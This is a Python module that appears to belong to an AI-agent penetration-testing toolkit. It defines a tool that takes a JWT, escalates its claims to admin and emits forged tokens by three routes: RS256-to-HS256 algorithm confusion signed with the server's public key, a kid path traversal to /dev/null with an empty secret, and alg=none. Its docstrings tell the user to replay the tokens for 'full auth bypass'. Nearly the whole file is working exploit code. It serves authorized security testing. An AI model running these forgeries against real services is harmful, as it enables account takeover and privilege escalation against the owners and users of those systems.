"""Advanced JWT forgery: algorithm confusion, kid injection, JWKS spoofing.

Beyond jwt_audit's alg=none + weak-secret crack, RS256→HS256 confusion forges a
token by HMAC-signing with the server's PUBLIC key (which a naive verify treats
as the HMAC secret), and kid injection points the key id at a predictable file
(``/dev/null`` → empty key) so a forged HS256 token verifies. Emits ready-to-
replay tokens — replay them with http_replay; acceptance = full auth bypass.
"""

from __future__ import annotations

import asyncio
import json
from typing import Any

from agents import RunContextWrapper, function_tool

from strix.tools.jwt_audit.tools import _b64url_encode, _decode_part, _sign_hs256


def _forge(header: dict[str, Any], payload: dict[str, Any], secret: str) -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{_sign_hs256(f'{h}.{p}', secret)}"


def _escalate(payload: dict[str, Any]) -> dict[str, Any]:
    out = {**payload}
    for field, value in (("role", "admin"), ("is_admin", True), ("admin", True), ("sub", "1")):
        if field in out:
            out[field] = value
    return out


def _jwt_confusion_impl(token: str, public_key: str | None) -> dict[str, Any]:
    parts = (token or "").strip().split(".")
    if len(parts) != 3:
        return {"success": False, "error": "not a JWT (header.payload.signature)"}
    header = _decode_part(parts[0])
    payload = _decode_part(parts[1])
    if header is None or payload is None:
        return {"success": False, "error": "header/payload not valid base64url JSON"}

    escalated = _escalate(payload)
    forged: dict[str, str] = {}
    findings: list[str] = []

    # RS256 -> HS256 confusion: sign with the public key material as the HMAC secret.
    if public_key:
        hs_header = {**header, "alg": "HS256"}
        forged["rs256_to_hs256"] = _forge(hs_header, escalated, public_key)
        findings.append("RS256→HS256 confusion token forged (signed with the public key)")
    elif str(header.get("alg", "")).upper().startswith("RS"):
        findings.append(
            "token is RS-signed — supply public_key (from /jwks or the cert) to forge RS256→HS256"
        )

    # kid injection: point kid at a predictable/empty key file so HS256 with an
    # empty secret verifies.
    kid_header = {**header, "alg": "HS256", "kid": "../../../../../../dev/null"}
    forged["kid_devnull_empty_secret"] = _forge(kid_header, escalated, "")
    findings.append("kid path-traversal token forged (kid→/dev/null, empty HMAC secret)")

    # alg=none (verify-skipping servers).
    none_header = {**header, "alg": "none"}
    h = _b64url_encode(json.dumps(none_header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(escalated, separators=(",", ":")).encode())
    forged["alg_none"] = f"{h}.{p}."

    return {
        "success": True,
        "alg": header.get("alg"),
        "escalated_claims": {
            k: escalated[k] for k in escalated if k in {"role", "is_admin", "admin", "sub"}
        },
        "forged_tokens": forged,
        "findings": findings,
        "note": "replay each forged token (Authorization: Bearer <token>); acceptance = bypass",
    }


@function_tool(timeout=30, strict_mode=False)
async def jwt_confusion(ctx: RunContextWrapper, token: str, public_key: str | None = None) -> str:
    """Forge JWT algorithm-confusion / kid-injection / alg=none tokens.

    Decodes the token, escalates its claims (role=admin, is_admin=true), and
    emits forged tokens: RS256→HS256 confusion (needs ``public_key`` — HMAC-signs
    with the public key), kid path-traversal to ``/dev/null`` with an empty
    secret, and alg=none. Replay each with ``http_replay``
    (``Authorization: Bearer <token>``); acceptance = full auth bypass. No
    network here. Only test authorized targets.

    Returns JSON with ``forged_tokens``, ``escalated_claims``, and ``findings``.

    Args:
        token: The JWT to weaponize.
        public_key: The server's RSA public key (PEM) for RS256→HS256 confusion —
            grab it from ``/.well-known/jwks.json`` or the TLS cert.
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(_jwt_confusion_impl, token, public_key),
        ensure_ascii=False,
        default=str,
    )
